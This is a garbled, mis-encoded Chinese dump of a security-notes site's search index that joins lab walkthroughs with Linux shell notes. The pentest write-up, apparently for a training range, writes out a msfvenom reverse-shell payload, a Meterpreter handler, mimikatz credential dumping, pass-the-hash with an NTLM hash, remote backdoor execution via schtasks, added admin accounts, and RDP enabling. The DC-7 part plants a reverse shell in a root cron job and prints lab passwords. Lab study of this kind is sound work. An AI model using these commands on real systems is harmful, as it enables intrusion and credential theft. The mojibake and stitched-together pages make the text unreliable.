åŠŸèƒ½ï¼Œæ‰€ä»¥å¯ä»¥è€ƒè™‘åŒ…å«æ—¥å¿—æ–‡ä»¶/sessionæ–‡ä»¶ï¼Œæˆ–è€…ä¸phpinfoç•Œé¢è¿ç”¨ã€‚ è¿™é‡Œé€‰æ‹©åŒ…å«æ—¥å¿—æ–‡ä»¶ DC6 https://blog.csdn.net/weixin_45996361/article/details/123431118 ç”¨æˆ·å¯†ç çˆ†ç ´ï¼ˆå­—å…¸ä¸ºDC2çš„ï¼‰ wordpressæ’ä»¶activity monitoræä¾›äº†pingå‘½ä»¤ï¼Œå¯¹ç”¨æˆ·è¾“å…¥æ— é™åˆ¶å¯¼è‡´rce é‚®ä»¶å¯†ç æ³„éœ² sudoææƒ nmapææƒ DC7 ç«¯å£ï¼š22,80 ä¿¡æ¯æ”¶é›†ï¼šgithubæºç æ³„éœ² è¿™ä¸ªè´¦æˆ·æµ‹è¯•åå¯ä»¥è¿æ¥ssh sshè¿æ¥åä¿¡æ¯æ”¶é›† æœ‰é‚®ä»¶ å‘ç°éƒ½æ˜¯ä»¥ä¸‹ä¿¡æ¯ï¼Œå¹¶ä¸”æ¯éš”ä¸€æ®µæ—¶é—´éƒ½æœ‰You have new mailæç¤ºï¼Œå¯ä»¥çŒœæµ‹å‡ºè¿™æ˜¯ä¸€ä¸ªå®šæ—¶è„šæœ¬ â€‹ dc7user@dc-7:~$ cat /opt/scripts/backups.sh #!/bin/bash rm /home/dc7user/backups/* cd /var/www/html/ drush sql-dump --result-file=/home/dc7user/backups/website.sql cd .. tar -czf /home/dc7user/backups/website.tar.gz html/ gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz chown dc7user:dc7user /home/dc7user/backups/* rm /home/dc7user/backups/website.sql rm /home/dc7user/backups/website.tar.gz drushæ˜¯drupalçš„å‘½ä»¤ï¼Œå¯ä»¥ä¿®æ”¹adminå¯†ç  ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆåœ¨ç½‘ç«™ç›®å½•ä¸‹æ‰å¯ä»¥ gpgæ˜¯å…¬é’¥åŠ å¯†ç®—æ³•ï¼Œæ²¡æ‰¾åˆ°å…¬é’¥ï¼Œæ‰€ä»¥æ— æ³•è§£å¯†ï¼Œå¦åˆ™å¯ä»¥è§£å¯†é‡æ–°å¯¼å…¥sqlæ–‡ä»¶ mysql -udc7user -pMdR3xOgB7#dW Staff ææƒ â€‹ é€šè¿‡ä¿®æ”¹adminå¯†ç ç™»å½•åå°ï¼Œå¯ä»¥ç¼–è¾‘åšå®¢æˆ–è€…é¡µé¢ã€‚é‚£ä¹ˆç›´æ¥é€‰æ‹©ç¼–è¾‘é¡µé¢å†™å…¥ä¸€ä¸ªæœ¨é©¬ã€‚ä½†æ˜¯éœ€è¦å…ˆå®‰è£…PHPæ¨¡å—ã€‚ â€‹ æœ¨é©¬å†™å…¥åï¼Œè·å¾—www-dataç”¨æˆ·æƒé™ â€‹ ä»å®šæ—¶è„šæœ¬æ‰€å±çš„ç”¨æˆ·å’Œç”¨æˆ·ç»„å…¥æ‰‹ï¼Œç”¨æˆ·ç»„ä¸ºwww-dataæƒé™ä¸ºrwxï¼šè¯´æ˜www -dataç”¨æˆ·å¯ä»¥å¯¹å…¶è¿›è¡Œè¯»å†™æ‰§è¡Œï¼Œæ‹¥æœ‰è€…ä¸ºrootï¼šè¯´æ˜å…¶è¿è¡Œæ—¶çš„æƒé™ä¸ºrootã€‚æ‰€ä»¥æˆ‘ä»¬å‘å…¶å†™å…¥åå¼¹shellï¼Œç­‰å¾…å…¶æ‰§è¡Œå°±å¯ä»¥è·å¾—rootæƒé™ã€‚ DC8 https://blog.csdn.net/q90375412/article/details/127351747 sqlæ³¨å…¥ï¼ˆsqlmapï¼‰ johnç ´è§£å¯†ç  åå°æ¨¡æ¿getshell exim4ææƒ DC9 https://blog.csdn.net/m0_65712192/article/details/129250059 å¯ä»¥å‘ç°sshæœåŠ¡æ˜¯filteredçš„ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-21 18:54:25 "},"06.WriteUp/é¶æœº/çº¢æ—¥é¶åœº1.html":{"url":"06.WriteUp/é¶æœº/çº¢æ—¥é¶åœº1.html","title":"çº¢æ—¥é¶åœº1","keywords":"","body":" é€šè¿‡MSFå¯¹çº¢æ—¥é¶åœº1è¿›è¡Œå†…ç½‘æ¸—é€ è·å¾—è¾¹ç•ŒæœåŠ¡å™¨æƒé™æ²¡å•¥å¥½å†™çš„å°±ä¸å†™äº† è·å¾—å¤–ç½‘ä¸»æœºæƒé™ æœ¨é©¬ç”Ÿæˆ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.41.128 -f exe > reverse.exe reverse_tcpä¸bind_tcpçš„åŒºåˆ« é˜²ç«å¢™å…³é—­ windows æŸ¥çœ‹çŠ¶æ€ netsh advfirewall show allprofile state æ›´æ”¹çŠ¶æ€ netsh advfirewall set allprofile state on/off ä¸å…³çš„è¯ï¼Œæ‰§è¡Œæœ¨é©¬å°±ä¼šå¼¹å‡ºè¿™ä¸ª è·å¾—ä¸»æœºsession use exploit/multi/handler set payload windows/meterpreter/reverse_tcp # è¦è®¾ç½®æœ¨é©¬çš„ç”Ÿæˆpayloadï¼Œä¸ç„¶è¿ä¸ä¸Š run ä¿¡æ¯æ”¶é›†ç­‰ è¿›ç¨‹è¿ç§» éšè”½è‡ªèº« é€‰æ‹©æ³¨å…¥åˆ°explorer.exeè¿›ç¨‹ä¸­ explorer.exeæ˜¯Windowsç¨‹åºç®¡ç†å™¨æˆ–è€…æ–‡ä»¶èµ„æºç®¡ç†å™¨ï¼Œå®ƒç”¨äºç®¡ç†Windowså›¾å½¢å£³ï¼ŒåŒ…æ‹¬æ¡Œé¢å’Œæ–‡ä»¶ç®¡ç†ï¼Œåˆ é™¤è¯¥ç¨‹åºä¼šå¯¼è‡´Windowså›¾å½¢ç•Œé¢æ— æ³•ä½¿ç”¨ã€‚ ps | grep \"explore\" migrate pid åˆ‡æ¢è¿›ç¨‹ä½æ•° ä¸åŒçš„ç¨‹åºéœ€è¦çš„ä½æ•°ä¸åŒ å¦‚ï¼šhashdumpï¼Œkiwiåªèƒ½åœ¨64ä½è¿›ç¨‹ä¸Šæ‰§è¡Œ ææƒ å…ˆè·å–åˆ°administratoræƒé™ å†ä½¿ç”¨getsystemå‘½ä»¤è·å–systemæƒé™ ä¸»æœºä¿¡æ¯æ”¶é›† # ä¸»æœºä¿¡æ¯ ps sysinfo run post/windows/gather/enum_applications # å®‰è£…çš„åº”ç”¨ run post/windows/gather/enum_patches # å®‰è£…çš„è¡¥ä¸ # ç½‘ç»œ route arp netstat â€“ano åŸŸä¿¡æ¯æ”¶é›† run post/windows/gather/enum_domain ä¸»æœºshellä¸‹ chcp 65001 #è§£å†³ä¹±ç  ipconfig /all # DNSåç¼€åˆ¤æ–­åŸŸæ˜¯å¦å­˜åœ¨ net time /domain # åˆ¤æ–­åŸŸæ§ nslookup time_domain # è·å–åŸŸæ§ip å¯†ç è·å– load kiwi creds_allï¼šåˆ—ä¸¾æ‰€æœ‰å‡­æ® creds_kerberosï¼šåˆ—ä¸¾æ‰€æœ‰kerberoså‡­æ® creds_msvï¼šåˆ—ä¸¾æ‰€æœ‰msvå‡­æ® creds_sspï¼šåˆ—ä¸¾æ‰€æœ‰sspå‡­æ® creds_tspkgï¼šåˆ—ä¸¾æ‰€æœ‰tspkgå‡­æ® creds_wdigestï¼šåˆ—ä¸¾æ‰€æœ‰wdigestå‡­æ® dcsyncï¼šé€šè¿‡DCSyncæ£€ç´¢ç”¨æˆ·å¸æˆ·ä¿¡æ¯ dcsync_ntlmï¼šé€šè¿‡DCSyncæ£€ç´¢ç”¨æˆ·å¸æˆ·NTLMæ•£åˆ—ã€SIDå’ŒRID golden_ticket_createï¼šåˆ›å»ºé»„é‡‘ç¥¨æ® kerberos_ticket_listï¼šåˆ—ä¸¾kerberosç¥¨æ® kerberos_ticket_purgeï¼šæ¸…é™¤kerberosç¥¨æ® kerberos_ticket_useï¼šä½¿ç”¨kerberosç¥¨æ® lsa_dump_samï¼šdumpå‡ºlsaçš„SAM lsa_dump_secretsï¼šdumpå‡ºlsaçš„å¯†æ–‡ password_changeï¼šä¿®æ”¹å¯†ç  wifi_listï¼šåˆ—å‡ºå½“å‰ç”¨æˆ·çš„wifié…ç½®æ–‡ä»¶ wifi_list_sharedï¼šåˆ—å‡ºå…±äº«wifié…ç½®æ–‡ä»¶/ç¼–ç  è°ƒç”¨mimikatz åœ¨å®‰è£…äº†KB2871997è¡¥ä¸æˆ–è€…ç³»ç»Ÿç‰ˆæœ¬å¤§äºwindows server 2012æ—¶ï¼Œç³»ç»Ÿçš„å†…å­˜ä¸­å°±ä¸å†ä¿å­˜æ˜æ–‡çš„å¯†ç ï¼Œè¿™æ ·åˆ©ç”¨mimikatzå°±ä¸èƒ½ä»å†…å­˜ä¸­è¯»å‡ºæ˜æ–‡å¯†ç äº†ã€‚mimikatzçš„ä½¿ç”¨éœ€è¦administratorç”¨æˆ·æ‰§è¡Œï¼Œadministratorsä¸­çš„å…¶ä»–ç”¨æˆ·éƒ½ä¸è¡Œã€‚ mimikatzå‘½ä»¤ åæ¸—é€]Mimikatzä½¿ç”¨å¤§å…¨ - è‚–æ´‹è‚–æ©ã€ - åšå®¢å›­ kiwi_cmd module::xxx kiwi_cmd sekurlsa::wdigest kiwi_cmd sekurlsa::logonpasswod ç«¯å£è½¬å‘ portfwd add -l 1234 -p 4444 -r 192.168.41.129 æ¨ªå‘ç§»åŠ¨ Venomä»£ç† å†…ç½‘ç©¿é€å·¥å…·---Venomä½¿ç”¨æ•™ç¨‹ socks port ç„¶åé…åˆproxychainsä½¿ç”¨ socketsä»£ç† MSFé…ç½® ä¸ºå½“å‰sesisonæ·»åŠ è·¯ç”± run autoroute -s 192.168.52.0/24 ä½¿ç”¨socks5æ¨¡å— background use auxiliary/server/socks_proxy set SRVHOST 127.0.0.1 run è¿™é‡Œéœ€è¦æŒ‰ä¸€ä¸‹å›è½¦ æŸ¥çœ‹jobs kalié…ç½® è®©kaliä¸­çš„å…¶ä»–å·¥å…·ä¹Ÿå¯è®¿é—®å†…ç½‘ä¸»æœº å®‰è£…proxychains sudo apt-get install proxychains ç¼–è¾‘é…ç½®æ–‡ä»¶ sudo vim /etc/proxychains.conf æŒ‰ç…§infoç»™å‡ºçš„ä¿¡æ¯ï¼Œæ·»åŠ socketä»£ç† VERSION SRVHOST SRVPORT USERNAME PASSWORD ä¸»æœºæ‰«æ run post/windows/gather/arp_scanner rhosts=192.168.52.0/24 ç«¯å£å’Œæ¼æ´æ‰«æ ä¸Šä¼ fscanè¿›è¡Œæ‰«æ proxychains nmap -Pn -sT -p22,80,445,21,3306,6379 -sC 192.168.52.141 æ³¨æ„ï¼šsocks5ä»£ç†-Pn -sTï¼Œä¸æ”¯æŒicmpåè®® æ¼æ´åˆ©ç”¨ æ ¹æ®fscançš„æ‰«æç»“æœå¯ä»¥çŸ¥é“åŸŸä¸­ä¸‰å°ä¸»æœºå‡å­˜åœ¨ms17_010æ¼æ´ åˆ©ç”¨ ç»è¿‡æµ‹è¯•ï¼Œå‘ç°åªèƒ½ç”¨admin/smb/ms17_010_command åœ¨Windows2003ä¸»æœºä¸Š æ·»åŠ æˆåŠŸ åŒç†åŸŸæ§server2008ä¹Ÿå¯ä»¥ä½¿ç”¨è¯¥payload ipc$è¿æ¥ IPC$(Internet Process Connection)æ˜¯å…±äº«â€å‘½åç®¡é“â€çš„èµ„æºï¼Œå®ƒæ˜¯ä¸ºäº†è®©è¿›ç¨‹é—´é€šä¿¡è€Œå¼€æ”¾çš„å‘½åç®¡é“ï¼Œä¹Ÿå°±æ˜¯ä¸¤ä¸ªè¿›ç¨‹ä¹‹é—´å¯ä»¥åˆ©ç”¨å®ƒäº§ç”Ÿæ•°æ®äº¤äº’ï¼Œå¯ä»¥é€šè¿‡éªŒè¯ç”¨æˆ·åå’Œå¯†ç è·å¾—ç›¸åº”çš„æƒé™ï¼Œåœ¨è¿œç¨‹ç®¡ç†è®¡ç®—æœºå’ŒæŸ¥çœ‹è®¡ç®—æœºçš„å…±äº«èµ„æºæ—¶ä½¿ç”¨ã€‚ net use \\\\ip /u:username password # å»ºç«‹ipc$è¿æ¥ net view \\\\ip # æŸ¥çœ‹ç›®æ ‡æœºå™¨çš„å…±äº«èµ„æº net use z: \\\\IP\\c$ # å°†ç›®æ ‡cç›˜æ˜ å°„ä¸ºæœ¬åœ°zç›˜ dir \\\\ip\\ç›˜ç¬¦$\\dir_path # åˆ—å‡ºæŒ‡å®šç›®å½•æ–‡ä»¶ copy \\\\ip\\ç›˜ç¬¦$\\file save_path # ä¸‹è½½æ–‡ä»¶ save_pathä¸ºç»å¯¹è·¯å¾„/ä¿å­˜åˆ°å½“å‰ç›®å½• copy file \\\\ip\\ç›˜ç¬¦$\\file # å¤åˆ¶æ–‡ä»¶ net use \\\\ip /del /y # åˆ é™¤ipc$è¿æ¥ ç‰ˆæœ¬ï¼œWindows2012 net time \\\\ip # æŸ¥çœ‹ç›®æ ‡æœºå™¨æ—¶é—´ at \\\\ip time(11:12) c:\\1.bat # åˆ›å»ºå®šæ—¶ä»»åŠ¡ ç‰ˆæœ¬ï¼Windows2012 ```cmd net time \\ip # æŸ¥çœ‹ç›®æ ‡æœºå™¨æ—¶é—´ schtasks /create /tn \"task\" /tr c:\\windows\\temp\\plugin_update.exe /sc once /st 16:32 /S ip /RU System /u username /p \"passwd\" åˆ›å»ºè¯¥æ—¶é—´ä¹‹åçš„æŸä¸ªæ—¶åˆ»è‡ªåŠ¨æ‰§è¡Œä»»åŠ¡ï¼Œä»»åŠ¡å plugin_update schtasks /run /tn \"task\" /S ip /u username /p \"passwd\" ç«‹å³è¿è¡Œåé—¨ç¨‹åº schtasks /F /delete /tn \"task\" /S ip /u username /p \"passwd\" åˆ é™¤åˆ›å»ºçš„ä»»åŠ¡ è¿™é‡Œæ·»åŠ äº†ç”¨æˆ·ï¼Œç”¨å¤–ç½‘æœºä½¿ç”¨ipc$ä¸åŸŸæ§å»ºç«‹è¿æ¥åï¼Œå‘ç°æ²¡æœ‰æƒé™ ![image-20230331151440023](../../../images/image-20230331151440023-1686283281462.png) è¿™æ˜¯å› ä¸ºæƒé™é—®é¢˜ [å…³äºIPCå’ŒPTHç”¨æˆ·æƒé™é—®é¢˜ | AresX's Blog](https://ares-x.com/2020/03/10/å…³äºIPCå’ŒPTHç”¨æˆ·æƒé™é—®é¢˜/) > å¯ä»¥å»ºç«‹ipc$è¿æ¥ï¼š > > - åŸŸç”¨æˆ·ï¼Œå¹¶ä¸”è¯¥åŸŸç”¨æˆ·åœ¨è¿œç¨‹è®¡ç®—æœºçš„ç®¡ç†å‘˜ç»„ä¸­ã€‚ > > - æœ¬åœ°ç®¡ç†å‘˜ç”¨æˆ· > > ï¼ˆå¦‚æœæœ¬åœ°ç®¡ç†å‘˜ç»„å¯ç”¨äº†Administratorï¼Œé‚£ä¹ˆæœ¬åœ°ç®¡ç†å‘˜é‡Œåªæœ‰Administratoræ˜¯å¯ä»¥è¿æ¥çš„ï¼‰ ```powershell net user khaz123 khaz777... /add net localgroup administrators username /add å°†khaz123ç”¨æˆ·æ·»åŠ åˆ°åŸŸæ§çš„æœ¬åœ°ç®¡ç†å‘˜ç»„ä¸­ï¼ˆå› ä¸ºæ˜¯åŸŸæ§æœåŠ¡å™¨æ·»åŠ ç”¨æˆ·ï¼Œè¯¥ç”¨æˆ·è‡ªåŠ¨ä¸ºåŸŸç”¨æˆ·ï¼‰ï¼Œipc$è¿æ¥æˆåŠŸ è¿œç¨‹æ¡Œé¢è¿æ¥ åŒä¸€æ—¶åˆ»åªèƒ½æœ‰ä¸€ä¸ªç”¨æˆ·ç™»å½• windows REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 0 /f msf å®é™…ä¸Špost/windows/manage/enable_rdpå°±æ˜¯åˆ©ç”¨äº†ä¸Šé¢windowsä¿®æ”¹æ³¨å†Œè¡¨çš„æ–¹å¼å¼€å¯3389ç«¯å£ run post/windows/manage/enable_rdp rdesktop ip PTH å“ˆå¸Œä¼ é€’æ”»å‡» æŒ‘æˆ˜å“åº”æœºåˆ¶ï¼Œåªè¦çŸ¥é“NTLMå“ˆå¸Œï¼Œæ— éœ€çŸ¥é“æ˜æ–‡å¯†ç ï¼Œå°±å¯ä»¥é€šè¿‡è®¤è¯ impacket å®‰è£…ï¼šsudo apt install python3-impacket proxychains xxx.py -hashes :91ff0fb948167eb4d080b5330686c02f Administrator@192.168.52.138 psexec.py smbexec.py wmiexec.py MSF use exploit/windows/smb/psexec set rhosts 192.168.52.138 set smbuser administrator set smbpass LM:NTLM set lhost 192.168.52.143 run PTTç¥¨æ®ä¼ é€’ åªè¦çŸ¥é“äº†KDCå’ŒServerå¯†é’¥ï¼Œå³å¯ä¼ªé€ é»„é‡‘ç¥¨æ®å’Œç™½é“¶ç¥¨æ® å‚è€ƒæ–‡ç«  https://blog.csdn.net/qq_44159028/article/details/124631522 https://blog.51cto.com/u_15127677/4045185 https://soapffz.com/archives/558/ åæ¸—é€ä¹‹meterpreterä½¿ç”¨æ”»ç•¥ - å…ˆçŸ¥ç¤¾åŒº Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-21 18:53:58 "},"07.åŸºç¡€çŸ¥è¯†/Linux/linux-shell.html":{"url":"07.åŸºç¡€çŸ¥è¯†/Linux/linux-shell.html","title":"ã€ŠLinuxå‘½ä»¤è¡Œä¸shellè„šæœ¬ç¼–ç¨‹å¤§å…¨ã€‹ ç¬”è®°","keywords":"","body":"å‰è¨€ï¼š ä»¥ä¸‹å†…å®¹ä¸ºé˜…è¯»Linuxå‘½ä»¤è¡Œä¸shellè„šæœ¬ç¼–ç¨‹å¤§å…¨.ç¬¬3ç‰ˆ (å¸ƒé²å§†ï¼Œå¸ƒé›·æ–¯çº³æ±‰) (z-lib.org)ç¬”è®°ã€‚ æ³¨ï¼šä¸‹é¢ä½¿ç”¨çš„linuxç³»ç»Ÿä¸ºé˜¿é‡Œäº‘æœåŠ¡å™¨Centos7ï¼ˆredhatï¼‰æˆ–è€…kaliï¼ˆdebianï¼‰ç³»ç»Ÿ äº†è§£shell shellç±»å‹ å½“ç”¨æˆ·ç™»å½•ç»ˆç«¯çš„æ—¶å€™ï¼Œé€šå¸¸ä¼šå¯åŠ¨ä¸€ä¸ªé»˜è®¤çš„äº¤äº’å¼shellã€‚ ç³»ç»Ÿç©¶ç«Ÿå¯åŠ¨å“ªä¸ªshellï¼Œè¿™å–å†³äºç”¨æˆ·IDé…ç½®ç³»ç»Ÿå¯åŠ¨ä»€ä¹ˆæ ·çš„shellç¨‹åºã€‚ åœ¨/etc/passwdæ–‡ä»¶ä¸­ï¼Œåœ¨ç”¨æˆ·IDè®°å½•çš„ç¬¬7ä¸ªå­—æ®µä¸­åˆ—å‡ºäº†é»˜è®¤çš„shellç¨‹åºã€‚ ä¾‹å¦‚åœ¨kaliä¸­ç™»å½•ç»ˆç«¯æ—¶ä½¿ç”¨çš„æ˜¯zshç±»å‹çš„shell. cat /etc/passwd khaz: x:1000:1000:khaz,,,:/home/khaz:/usr/bin/zsh â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢] â””â”€$ ls -F /usr/bin/zsh /usr/bin/zsh* è¯´æ˜/usr/bin/zshæ˜¯ä¸€ä¸ªå¯æ‰§è¡Œç¨‹åº â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢] â””â”€$ ls -l /bin/sh lrwxrwxrwx 1 root root 4 3æœˆ 14 2022 /bin/sh -> dash å¯ä»¥å‘ç°ç”¨æˆ·å’Œç³»ç»Ÿä½¿ç”¨çš„shellç±»å‹ä¸åŒã€‚ æŸ¥çœ‹æ‰€æœ‰shell khaz@DESKTOP-JCNAFF7:~$ cat /etc/shells # /etc/shells: valid login shells /bin/sh /bin/bash /usr/bin/bash /bin/rbash /usr/bin/rbash /bin/dash /usr/bin/dash /usr/bin/tmux /usr/bin/screen /bin/zsh /usr/bin/zsh é€šå¸¸è¯´çš„shåªæ˜¯ä¸€ä¸ªè½¯è¿æ¥ï¼Œå¹¶ä¸æ˜¯çœŸçš„æœ‰ä¸€ä¸ªshellå«shã€‚ åœ¨debianç³»æ“ä½œç³»ç»Ÿä¸­ï¼ŒshæŒ‡å‘dashï¼› åœ¨centosç³»æ“ä½œç³»ç»Ÿä¸­ï¼ŒshæŒ‡å‘bashã€‚ shellçš„çˆ¶å­å…³ç³» åœ¨å³è¾¹çš„å‘½ä»¤è¡Œä¸­å¯ä»¥çœ‹åˆ°bashè¿›ç¨‹çš„ppidå°±æ˜¯/user/bin/zshçš„pidï¼Œæ‰€ä»¥äºŒè€…æ˜¯çˆ¶å­å…³ç³»ã€‚ å¤šæ¬¡åˆ›å»ºbash é€€å‡ºå½“å‰shellï¼Œexit å¯åŠ¨shellæ—¶çš„å‚æ•° khaz@DESKTOP-JCNAFF7:~$ bash -r khaz@DESKTOP-JCNAFF7:~$ cd ../ bash: cd: restricted khaz@DESKTOP-JCNAFF7:~$ å‘½ä»¤åˆ—è¡¨ ä»¥;éš”å¼€çš„å¤šä¸ªå‘½ä»¤ pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls ; echo $BASH_SUBSHELL è¿›ç¨‹åˆ—è¡¨ åˆ›å»ºä¸€ä¸ªå­shellæ¥æ‰§è¡Œå‘½ä»¤åˆ—è¡¨ (pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls ; echo $BASH_SUBSHELL) echo $BASH_SUBSHELLï¼šè¾“å‡ºå­shellæ•°é‡ [root@izwz99bgx9y93dmv0mir0ez ~]# (pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls ; echo $BASH_SUBSHELL) /root H1ve web /etc /root H1ve web 1 [root@izwz99bgx9y93dmv0mir0ez ~]# ( pwd ; echo $BASH_SUBSHELL) /root 1 [root@izwz99bgx9y93dmv0mir0ez ~]# ( pwd ;(echo $BASH_SUBSHELL)) /root 2 å¯ä»¥çœ‹å‡ºæœ‰å‡ ä¸ªæ‹¬å·å°±æœ‰å‡ ä¸ªå­shell ä½¿ç”¨linuxç¯å¢ƒå˜é‡ å®šä¹‰ å­˜å‚¨æœ‰å…³shellä¼šè¯å’Œå·¥ä½œç¯å¢ƒçš„ä¿¡æ¯çš„å˜é‡ç§°ä¸ºç¯å¢ƒå˜é‡ åˆ†ç±» å…¨å±€å˜é‡ å±€éƒ¨å˜é‡ è¿™é‡Œçš„èŒƒå›´æŒ‡çš„æ˜¯å˜é‡å­˜åœ¨äºå“ªäº›shellä¼šè¯ä¸­ å…¨å±€ç¯å¢ƒå˜é‡ ç³»ç»Ÿç¯å¢ƒå˜é‡åŸºæœ¬ä¸Šéƒ½æ˜¯ä½¿ç”¨å…¨å¤§å†™å­—æ¯ï¼Œä»¥åŒºåˆ«äºæ™®é€šç”¨æˆ·çš„ç¯å¢ƒå˜é‡ã€‚ æŸ¥çœ‹å…¨å±€å˜é‡ env æˆ–è€…printenvï¼šåªè¾“å‡ºå…¨éƒ¨çš„å…¨å±€å˜é‡ [root@izwz99bgx9y93dmv0mir0ez ~]# env (printenvè¾“å‡ºçš„ä¸å…¶ç›¸åŒ) XDG_SESSION_ID=897 HOSTNAME=izwz99bgx9y93dmv0mir0ez TERM=xterm SHELL=/bin/bash HISTSIZE=1000 SSH_TTY=/dev/pts/0 USER=root .... printenv var_nameæˆ–è€… echo $var_nameï¼šè¾“å‡ºç‰¹å®šå˜é‡çš„å€¼ã€‚ [root@izwz99bgx9y93dmv0mir0ez ~]# printenv USER root [root@izwz99bgx9y93dmv0mir0ez ~]# echo $USER root å…¨å±€ç¯å¢ƒå˜é‡å­˜åœ¨äºæ‰€æœ‰çš„shellä¼šè¯ä¸­ [root@izwz99bgx9y93dmv0mir0ez ~]# bash [root@izwz99bgx9y93dmv0mir0ez ~]# ps -f UID PID PPID C STIME TTY TIME CMD root 11337 11335 0 20:14 pts/0 00:00:00 -bash root 11371 11337 0 20:31 pts/0 00:00:00 bash root 11382 11371 0 20:31 pts/0 00:00:00 ps -f [root@izwz99bgx9y93dmv0mir0ez ~]# echo $HOME /root [root@izwz99bgx9y93dmv0mir0ez ~]# exit exit [root@izwz99bgx9y93dmv0mir0ez ~]# ps -f UID PID PPID C STIME TTY TIME CMD root 11337 11335 0 20:14 pts/0 00:00:00 -bash root 11383 11337 0 20:32 pts/0 00:00:00 ps -f [root@izwz99bgx9y93dmv0mir0ez ~]# echo $HOME /root åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œç”¨bashå‘½ä»¤ç”Ÿæˆä¸€ä¸ªå­shellåï¼Œæ˜¾ç¤ºäº†HOMEç¯å¢ƒå˜é‡çš„å½“å‰å€¼ï¼Œè¿™ä¸ªå€¼å’Œçˆ¶shellä¸­çš„ä¸€æ¨¡ä¸€æ ·ï¼Œéƒ½æ˜¯/rootã€‚ å±€éƒ¨ç¯å¢ƒå˜é‡ æŸ¥çœ‹å±€éƒ¨å˜é‡ åœ¨Linuxç³»ç»Ÿå¹¶æ²¡æœ‰ä¸€ä¸ªåªæ˜¾ç¤ºå±€éƒ¨ç¯å¢ƒå˜é‡çš„å‘½ä»¤ã€‚ set setå‘½ä»¤ä¼šæ˜¾ç¤ºä¸ºæŸä¸ªç‰¹å®šè¿›ç¨‹è®¾ç½®çš„æ‰€æœ‰ç¯å¢ƒå˜é‡ï¼ŒåŒ…æ‹¬å±€éƒ¨å˜é‡ã€å…¨å±€å˜é‡ä»¥åŠç”¨æˆ·å®šä¹‰å˜é‡ã€‚ [root@izwz99bgx9y93dmv0mir0ez ~]# set BASH=/bin/bash BASHOPTS=checkwinsize:cmdhist:expand_aliases:extquote:force_fignore:histappend:hostcomplete:interactive_comments:login_shell:progcomp:promptvars:sourcepath BASH_ALIASES=() BASH_ARGC=() BASH_ARGV=() BASH_CMDS=() BASH_LINENO=() BASH_SOURCE=() BASH_VERSINFO=([0]=\"4\" [1]=\"2\" [2]=\"46\" [3]=\"2\" [4]=\"release\" [5]=\"x86_64-redhat-linux-gnu\") BASH_VERSION='4.2.46(2)-release' COLUMNS=210 DIRSTACK=() EUID=0 GROUPS=() .... setå‘½ä»¤ä¼šæ˜¾ç¤ºå‡ºå…¨å±€å˜é‡ã€å±€éƒ¨å˜é‡ä»¥åŠç”¨æˆ·å®šä¹‰å˜é‡ã€‚å®ƒè¿˜ä¼šæŒ‰ç…§å­—æ¯é¡ºåºå¯¹ç»“æœè¿›è¡Œæ’åºã€‚ envå’Œprintenvå‘½ä»¤åŒsetå‘½ä»¤çš„åŒºåˆ«åœ¨äºå‰ä¸¤ä¸ªå‘½ä»¤ä¸ä¼šå¯¹å˜é‡æ’åºï¼Œä¹Ÿä¸ä¼šè¾“å‡ºå±€éƒ¨å˜é‡å’Œç”¨æˆ·å®šä¹‰å˜é‡ã€‚ è®¾ç½®å±€éƒ¨ç”¨æˆ·è‡ªå®šä¹‰å˜é‡ ä¸€æ—¦å¯åŠ¨äº†bash shellï¼ˆæˆ–è€…æ‰§è¡Œä¸€ä¸ªshellè„šæœ¬ï¼‰ï¼Œå°±èƒ½åˆ›å»ºåœ¨è¿™ä¸ªshellè¿›ç¨‹å†…å¯è§çš„å±€éƒ¨å˜é‡äº†ã€‚ å¯ä»¥é€šè¿‡ç­‰å·ç»™ç¯å¢ƒå˜é‡èµ‹å€¼ï¼Œå€¼å¯ä»¥æ˜¯æ•°å€¼æˆ–å­—ç¬¦ä¸²ã€‚ [root@izwz99bgx9y93dmv0mir0ez ~]# echo $first_var æ³¨ï¼šå› ä¸ºæ²¡æœ‰å®šä¹‰first_varå˜é‡ï¼Œæ‰€ä»¥è¾“å‡ºä¸ºç©ºã€‚ [root@izwz99bgx9y93dmv0mir0ez ~]# $first_var=hello world -bash: =hello: command not found æ³¨ï¼šå®šä¹‰å˜é‡æ—¶æ— éœ€åŠ ä¸Š$ [root@izwz99bgx9y93dmv0mir0ez ~]# first_var=hello world -bash: world: command not found æ³¨ï¼šåœ¨ä¸ºå˜é‡èµ‹å€¼å­—ç¬¦ä¸²æ—¶ï¼Œå¦‚æœå­—ç¬¦ä¸²æœ‰å¼•å·ï¼Œå°±éœ€è¦ç”¨å•å¼•å·æ‹¬èµ·æ¥ã€‚ å¼•ç”¨ï¼šæ²¡æœ‰å•å¼•å·çš„è¯ï¼Œbash shellä¼šä»¥ä¸ºä¸‹ä¸€ä¸ªè¯æ˜¯å¦ä¸€ä¸ªè¦æ‰§è¡Œçš„å‘½ä»¤ root@izwz99bgx9y93dmv0mir0ez ~]# first_var ='hello world' -bash: first_var: command not found [root@izwz99bgx9y93dmv0mir0ez ~]# first_var= 'hello world' -bash: hello world: command not found æ³¨ï¼šå˜é‡å’Œ=å’Œå€¼ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼ï¼Œå¦åˆ™shellä¼šæŠŠå…¶å½“æˆå‘½ä»¤ã€‚ [root@izwz99bgx9y93dmv0mir0ez ~]# first_var='hello world' [root@izwz99bgx9y93dmv0mir0ez ~]# echo $first_var hello world å±€éƒ¨å˜é‡çš„èŒƒå›´ [root@izwz99bgx9y93dmv0mir0ez ~]# ps -f UID PID PPID C STIME TTY TIME CMD root 11337 11335 0 20:14 